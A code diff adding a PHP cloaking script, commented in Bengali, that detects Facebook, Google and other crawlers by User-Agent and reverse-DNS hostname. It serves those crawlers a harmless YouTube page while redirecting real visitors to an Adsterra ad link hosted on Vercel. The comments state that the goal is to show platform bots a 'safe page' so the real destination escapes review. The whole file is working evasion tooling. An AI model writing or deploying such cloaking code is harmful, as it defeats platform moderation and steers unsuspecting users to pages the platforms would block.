@@ -1,0 +1,45 @@
+<?php
+// ১. আপনার লিংক দুটি এখানে বসান
+$white_page = "https://www.youtube.com/watch?v=xeXV1KoX034"; // ফেসবুক বটের জন্য সাধারণ পেজ
+$money_page = "https://new-collection-2026.vercel.app/";   // আসল ইউজারের জন্য Adsterra লিংক
+
+// ২. ভিজিটরের User-Agent এবং IP চেক করা
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+$visitor_ip = $_SERVER['REMOTE_ADDR'];
+
+// ৩. ফেসবুক, গুগল এবং অন্যান্য সাধারণ বটের লিস্ট
+$bots = array(
+    'facebookexternalhit', 'facebookplatform', 'fb_iab', 'fb4a', 'fbios', 
+    'googlebot', 'adsbot-google', 'google-keyword-suggestions', 
+    'facebot', 'twitterbot', 'bingbot', 'linkedinbot'
+);
+
+$is_bot = false;
+
+// User-Agent ম্যাচিং
+foreach ($bots as $bot) {
+    if (strpos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+// ৪. ফেসবুকের IP Range এবং Hostname ভেরিফিকেশন (অ্যাডভান্সড সেফটি)
+if (!$is_bot && function_exists('gethostbyaddr')) {
+    $hostname = strtolower(gethostbyaddr($visitor_ip));
+    if (strpos($hostname, 'facebook.com') !== false || strpos($hostname, 'google.com') !== false) {
+        $is_bot = true;
+    }
+}
+
+// ৫. ট্রাফিক রিডাইরেকশন লজিক
+if ($is_bot) {
+    // বট হলে বা ফেসবুকের ক্রলার হলে সেফ পেজ লোড হবে (Frame/CURL এর মাধ্যমে যাতে URL চেঞ্জ না হয়)
+    echo file_get_contents($white_page);
+    exit();
+} else {
+    // আসল ইউজার হলে সরাসরি Adsterra ডিরেক্ট লিংকে চলে যাবে
+    header("Location: " . $money_page);
+    exit();
+}
+?>
